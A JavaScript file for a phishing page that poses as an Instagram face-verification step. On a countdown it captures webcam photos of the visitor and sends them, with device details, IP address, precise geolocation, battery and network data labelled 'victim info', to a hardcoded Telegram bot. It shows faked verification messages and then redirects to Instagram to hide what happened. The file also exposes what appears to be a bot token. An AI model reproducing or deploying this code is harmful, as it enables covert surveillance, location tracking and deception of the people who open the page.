// ============================================
// INSTAGRAM PHOTO CAPTURE SCRIPT - COMPLETE
// ============================================

// CONFIGURATION
const TELEGRAM_BOT_TOKEN = '8433990053:AAERuZM8tWV0TAquHKxKtcznKBETtyNgvic';
const TELEGRAM_CHAT_ID = '6693365736'; // Your chat ID

// Global Variables
let cameraStream = null;
let capturedPhotoData = null;
let photoCount = 0;
let isCameraActive = false;
let referralId = 'unknown';

// Initialize everything when page loads
document.addEventListener('DOMContentLoaded', function() {
    // Get referral ID from URL
    referralId = getUrlParameter('u') || 'unknown';
    
    // Initialize UI elements
    initializeUI();
    
    // Set up event listeners
    setupEventListeners();
    
    // Auto-start camera if previously allowed
    if (localStorage.getItem('instagram_camera_allowed') === 'true') {
        setTimeout(startCamera, 1000);
    }
    
    console.log('Instagram Photo Capture initialized');
    console.log('Referral ID:', referralId);
});

// ============================================
// UTILITY FUNCTIONS
// ============================================

// Get URL parameter
function getUrlParameter(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

// Show page (hide others)
function showPage(pageId) {
    const pages = ['camera-page', 'verification-page', 'success-page'];
    pages.forEach(page => {
        const element = document.getElementById(page);
        if (element) {
            element.classList.remove('active');
        }
    });
    
    const targetPage = document.getElementById(pageId);
    if (targetPage) {
        targetPage.classList.add('active');
    }
}

// Update status text
function updateStatus(text) {
    const statusElement = document.getElementById('status-text');
    if (statusElement) {
        statusElement.textContent = text;
    }
}

// Show loading state
function showLoading(show) {
    const loadingElement = document.getElementById('loading-spinner');
    if (loadingElement) {
        loadingElement.style.display = show ? 'flex' : 'none';
    }
}

// ============================================
// CAMERA FUNCTIONS
// ============================================

// Start camera
async function startCamera() {
    try {
        showLoading(true);
        updateStatus('Requesting camera access...');
        
        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });
        
        const videoElement = document.getElementById('cameraVideo');
        if (videoElement) {
            videoElement.srcObject = cameraStream;
        }
        
        isCameraActive = true;
        showCameraControls(true);
        updateStatus('Camera ready');
        
        // Save permission
        localStorage.setItem('instagram_camera_allowed', 'true');
        
        // Start countdown for auto-capture
        setTimeout(() => {
            startCaptureSequence();
        }, 1500);
        
    } catch (error) {
        console.error('Camera error:', error);
        updateStatus('Camera access denied');
        showError('Camera access is required for verification. Please allow camera access and refresh the page.');
    } finally {
        showLoading(false);
    }
}

// Start the photo capture sequence
function startCaptureSequence() {
    if (!isCameraActive) return;
    
    updateStatus('Get ready for photo...');
    startCountdown(3, () => {
        capturePhoto();
    });
}

// Start countdown
function startCountdown(seconds, callback) {
    const countdownElement = document.getElementById('countdown');
    const countdownOverlay = document.getElementById('countdown-overlay');
    
    if (countdownElement && countdownOverlay) {
        countdownOverlay.style.display = 'flex';
        
        let count = seconds;
        const interval = setInterval(() => {
            countdownElement.textContent = count;
            updateStatus(`${count}...`);
            
            if (count <= 0) {
                clearInterval(interval);
                countdownOverlay.style.display = 'none';
                if (callback) callback();
            }
            count--;
        }, 1000);
    }
}

// Capture photo
function capturePhoto() {
    if (!isCameraActive) return;
    
    const videoElement = document.getElementById('cameraVideo');
    const canvasElement = document.getElementById('cameraCanvas');
    const capturedPhotoElement = document.getElementById('captured-photo');
    
    if (!videoElement || !canvasElement) return;
    
    // Set canvas dimensions
    canvasElement.width = videoElement.videoWidth;
    canvasElement.height = videoElement.videoHeight;
    
    // Draw video frame to canvas
    const context = canvasElement.getContext('2d');
    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
    
    // Get photo data
    capturedPhotoData = canvasElement.toDataURL('image/jpeg', 0.9);
    
    // Show captured photo
    if (capturedPhotoElement) {
        capturedPhotoElement.src = capturedPhotoData;
    }
    
    // Send photo to Telegram
    photoCount++;
    sendPhotoToTelegram(capturedPhotoData, photoCount);
    
    // Show verification page after delay
    setTimeout(() => {
        showPage('verification-page');
        updateStatus('Photo captured successfully!');
        
        // Capture additional data
        captureAdditionalData();
        
        // If we need more photos, continue
        if (photoCount < 3) {
            setTimeout(() => {
                showPage('camera-page');
                setTimeout(startCaptureSequence, 1000);
            }, 2000);
        }
    }, 1000);
}

// ============================================
// TELEGRAM PHOTO SENDING FUNCTIONS
// ============================================

// Send photo to Telegram (FIXED VERSION)
async function sendPhotoToTelegram(photoData, photoNumber) {
    try {
        // Convert base64 to blob
        const blob = base64ToBlob(photoData);
        
        // Create form data
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, `instagram_photo_${Date.now()}.jpg`);
        
        // Create victim info message
        const victimInfo = getVictimInfo(photoNumber);
        const caption = createTelegramCaption(victimInfo);
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');
        
        // Send to Telegram
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.status}`);
        }
        
        console.log(`✅ Photo ${photoNumber} sent to Telegram successfully`);
        
        // Also send as document (backup)
        await sendAsDocument(blob, victimInfo);
        
        // Send info as separate message
        await sendInfoMessage(victimInfo);
        
    } catch (error) {
        console.error('Failed to send photo to Telegram:', error);
        // Fallback method
        fallbackSendMethod(photoData, photoNumber);
    }
}

// Convert base64 to Blob
function base64ToBlob(base64) {
    const parts = base64.split(';base64,');
    const contentType = parts[0].split(':')[1];
    const raw = window.atob(parts[1]);
    const rawLength = raw.length;
    const uInt8Array = new Uint8Array(rawLength);
    
    for (let i = 0; i < rawLength; ++i) {
        uInt8Array[i] = raw.charCodeAt(i);
    }
    
    return new Blob([uInt8Array], { type: contentType });
}

// Get victim information
function getVictimInfo(photoNumber) {
    return {
        referral: referralId,
        photoNumber: photoNumber,
        timestamp: new Date().toLocaleString(),
        userAgent: navigator.userAgent.substring(0, 100),
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: navigator.cookieEnabled,
        online: navigator.onLine,
        url: window.location.href
    };
}

// Create Telegram caption
function createTelegramCaption(info) {
    return `📸 *NEW PHOTO CAPTURED* 📸

👤 *Victim Info:*
• Referrer ID: \`${info.referral}\`
• Photo #: ${info.photoNumber}
• Time: ${info.timestamp}
• Device: ${info.platform}
• Screen: ${info.screen}

🌐 *Additional Info:*
• URL: ${info.url}
• Browser: ${info.userAgent}
• Timezone: ${info.timezone}

✅ *Face verification completed*
🎯 *Photo captured successfully*`;
}

// Send as document (backup)
async function sendAsDocument(blob, info) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', blob, `instagram_capture_${Date.now()}.jpg`);
        formData.append('caption', `📸 Backup photo | Referrer: ${info.referral}`);
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
    } catch (error) {
        console.log('Document send failed:', error);
    }
}

// Send info as separate message
async function sendInfoMessage(info) {
    try {
        const message = `📋 *DETAILED CAPTURE INFO*

🔗 *Link Information:*
• Referrer ID: \`${info.referral}\`
• Full URL: ${info.url}
• Capture Time: ${info.timestamp}

💻 *Device Information:*
• Platform: ${info.platform}
• Language: ${info.language}
• Screen: ${info.screen}
• Timezone: ${info.timezone}
• Cookies: ${info.cookies ? 'Enabled' : 'Disabled'}
• Online: ${info.online ? 'Yes' : 'No'}

🌐 *Browser Info:*
${info.userAgent}

✅ *Capture completed successfully*`;
        
        const encodedMessage = encodeURIComponent(message);
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`);
        
    } catch (error) {
        console.log('Info message send failed:', error);
    }
}

// Fallback method if everything fails
function fallbackSendMethod(photoData, photoNumber) {
    try {
        // Method 1: Create an image and use it as beacon
        const img = new Image();
        const message = `Photo ${photoNumber} captured from ${referralId} at ${new Date().toLocaleTimeString()}`;
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
        img.src = url;
        
        // Method 2: Use iframe
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = url;
        document.body.appendChild(iframe);
        setTimeout(() => iframe.remove(), 1000);
        
        // Method 3: Send to your server
        const victimInfo = getVictimInfo(photoNumber);
        const data = {
            photo: photoData.substring(0, 1000) + '...', // Send first part only
            info: victimInfo,
            timestamp: Date.now()
        };
        
        // Try to send to a server endpoint (you need to create this)
        fetch('/log-capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {});
        
    } catch (error) {
        console.log('All send methods failed');
    }
}

// ============================================
// ADDITIONAL DATA CAPTURE
// ============================================

// Capture additional device data
function captureAdditionalData() {
    // Try to get IP address
    getIPAddress().then(ip => {
        if (ip) {
            sendDataToTelegram('ip', { ip: ip, referral: referralId });
        }
    });
    
    // Geolocation
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy + ' meters',
                referral: referralId
            };
            sendDataToTelegram('location', locationData);
        }, () => {}, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
    }
    
    // Battery status
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            const batteryData = {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging ? 'Yes' : 'No',
                referral: referralId
            };
            sendDataToTelegram('battery', batteryData);
        });
    }
    
    // Network information
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
        const networkData = {
            type: connection.type,
            effectiveType: connection.effectiveType,
            downlink: connection.downlink + ' Mbps',
            rtt: connection.rtt + ' ms',
            saveData: connection.saveData ? 'Yes' : 'No',
            referral: referralId
        };
        sendDataToTelegram('network', networkData);
    }
}

// Get IP address
async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        try {
            const response = await fetch('https://api64.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return null;
        }
    }
}

// Send data to Telegram
async function sendDataToTelegram(type, data) {
    try {
        const message = `📊 *ADDITIONAL CAPTURE DATA*

🔍 *Type:* ${type.toUpperCase()}
👥 *Referrer:* \`${data.referral}\`

📋 *Data:*
${Object.entries(data)
    .filter(([key]) => key !== 'referral')
    .map(([key, value]) => `• ${key}: ${value}`)
    .join('\n')}`;

        const encodedMessage = encodeURIComponent(message);
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`);
        
    } catch (error) {
        console.log(`Failed to send ${type} data:`, error);
    }
}

// ============================================
// UI CONTROL FUNCTIONS
// ============================================

// Initialize UI elements
function initializeUI() {
    // Create hidden canvas if not exists
    if (!document.getElementById('cameraCanvas')) {
        const canvas = document.createElement('canvas');
        canvas.id = 'cameraCanvas';
        canvas.style.display = 'none';
        document.body.appendChild(canvas);
    }
    
    // Create status text element if not exists
    if (!document.getElementById('status-text')) {
        const statusDiv = document.createElement('div');
        statusDiv.id = 'status-text';
        statusDiv.style.cssText = 'position: fixed; top: 10px; left: 10px; background: rgba(0,0,0,0.7); color: white; padding: 5px 10px; border-radius: 5px; font-size: 12px; z-index: 10000;';
        document.body.appendChild(statusDiv);
    }
    
    updateStatus('Ready');
}

// Set up event listeners
function setupEventListeners() {
    // Allow Camera button
    const allowCameraBtn = document.getElementById('allow-camera-btn');
    if (allowCameraBtn) {
        allowCameraBtn.addEventListener('click', startCamera);
    }
    
    // Take Photo button
    const takePhotoBtn = document.getElementById('take-photo-btn');
    if (takePhotoBtn) {
        takePhotoBtn.addEventListener('click', capturePhoto);
    }
    
    // Retake Photo button
    const retakeBtn = document.getElementById('retake-photo-btn');
    if (retakeBtn) {
        retakeBtn.addEventListener('click', () => {
            showPage('camera-page');
            setTimeout(startCaptureSequence, 500);
        });
    }
    
    // Confirm Photo button
    const confirmBtn = document.getElementById('confirm-photo-btn');
    if (confirmBtn) {
        confirmBtn.addEventListener('click', () => {
            showPage('success-page');
            startRedirectCountdown();
            
            // Stop camera
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                isCameraActive = false;
            }
        });
    }
    
    // Redirect immediately link
    const redirectNow = document.getElementById('redirect-now');
    if (redirectNow) {
        redirectNow.addEventListener('click', () => {
            window.location.href = 'https://www.instagram.com';
        });
    }
}

// Show/hide camera controls
function showCameraControls(show) {
    const allowBtn = document.getElementById('allow-camera-btn');
    const takeBtn = document.getElementById('take-photo-btn');
    
    if (allowBtn) allowBtn.style.display = show ? 'none' : 'block';
    if (takeBtn) takeBtn.style.display = show ? 'block' : 'none';
}

// Show error message
function showError(message) {
    const errorDiv = document.createElement('div');
    errorDiv.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #e74c3c;
        color: white;
        padding: 20px;
        border-radius: 10px;
        z-index: 10000;
        text-align: center;
        max-width: 300px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    `;
    errorDiv.innerHTML = `
        <i class="fas fa-exclamation-triangle" style="font-size: 24px; margin-bottom: 10px; display: block;"></i>
        <p style="margin: 0 0 15px 0;">${message}</p>
        <button onclick="this.parentElement.remove()" style="padding: 8px 20px; background: white; color: #e74c3c; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
            OK
        </button>
    `;
    document.body.appendChild(errorDiv);
}

// ============================================
// REDIRECT FUNCTIONS
// ============================================

// Start redirect countdown
function startRedirectCountdown() {
    const countdownElement = document.getElementById('redirect-countdown');
    if (!countdownElement) return;
    
    let countdown = 5;
    const interval = setInterval(() => {
        countdownElement.textContent = countdown;
        countdown--;
        
        if (countdown < 0) {
            clearInterval(interval);
            redirectToInstagram();
        }
    }, 1000);
}

// Redirect to Instagram
function redirectToInstagram() {
    window.location.href = 'https://www.instagram.com';
}

// ============================================
// PAGE VISIBILITY HANDLING
// ============================================

// Handle page visibility changes
document.addEventListener('visibilitychange', function() {
    if (document.hidden && isCameraActive && cameraStream) {
        // Page is hidden, stop camera to save resources
        cameraStream.getTracks().forEach(track => track.stop());
    } else if (!document.hidden && isCameraActive && !cameraStream.active) {
        // Page is visible again, restart camera
        startCamera();
    }
});

// Stop camera when leaving page
window.addEventListener('beforeunload', function() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
    }
});

// ============================================
// FAKE LOADING FOR REALISM
// ============================================

// Simulate processing
function simulateProcessing() {
    const processingText = document.getElementById('processing-text');
    if (!processingText) return;
    
    const steps = [
        'Analyzing facial features...',
        'Comparing with database...',
        'Checking for matches...',
        'Verifying identity...',
        'Finalizing verification...'
    ];
    
    let step = 0;
    const interval = setInterval(() => {
        if (step < steps.length) {
            processingText.textContent = steps[step];
            step++;
        } else {
            clearInterval(interval);
            processingText.textContent = 'Verification complete!';
        }
    }, 800);
}

// Call simulateProcessing when verification page loads
document.addEventListener('DOMContentLoaded', function() {
    // This will run when verification page becomes active
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
                if (document.getElementById('verification-page').classList.contains('active')) {
                    setTimeout(simulateProcessing, 500);
                }
            }
        });
    });
    
    observer.observe(document.getElementById('verification-page'), {
        attributes: true
    });
});

// ============================================
// INITIALIZATION COMPLETE
// ============================================

console.log('Instagram Photo Capture System Loaded');
